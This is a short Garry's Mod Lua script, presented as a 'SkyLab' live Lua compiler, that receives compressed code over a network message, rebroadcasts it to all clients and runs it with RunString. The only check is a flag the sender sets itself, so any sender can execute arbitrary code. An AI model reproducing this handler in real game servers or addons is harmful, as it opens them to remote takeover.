--[[---------------------------------
	SkyLab | Lua Compiler:
	TimeStamp: 08/23/20
	Author: Warlord
    Contact: clearwater9401@gmail.com

    Copyright, all rights reserved

    License: CC BY-NC-ND 3.0
    Licensed to Team Skylon (Sixmax & Warlord)
-----------------------------------]]


if not SSLE then 
	return 
end

local self 	    	= {}
local tonumber  	= tonumber
local type      	= type
local RunString 	= RunString
local net_receive   = net.Receive
local net_readbool  = net.ReadBool
local decompressor  = util.Decompress
local net_readdata  = net.ReadData
local net_readfloat = net.ReadFloat


net_receive ("SkyLab-LiveExample",
	function (len)
		local Allowed = net_readbool  ()
		local Buffer  = net_readfloat ()
		local Packets = net_readdata  (Buffer)
		local FinDats = decompressor  (Packets)
		
		if not Allowed then
			return
		end
		
		net.Start 	   ("SkyLab-LiveDownloader")
		net.WriteBool  (true)
		net.WriteFloat (Packets:len())
		net.WriteData  (Packets, Packets:len())
		net.Broadcast  ()
		
		RunString (FinDats,"SkyLab|LuaCompiler")
	end
)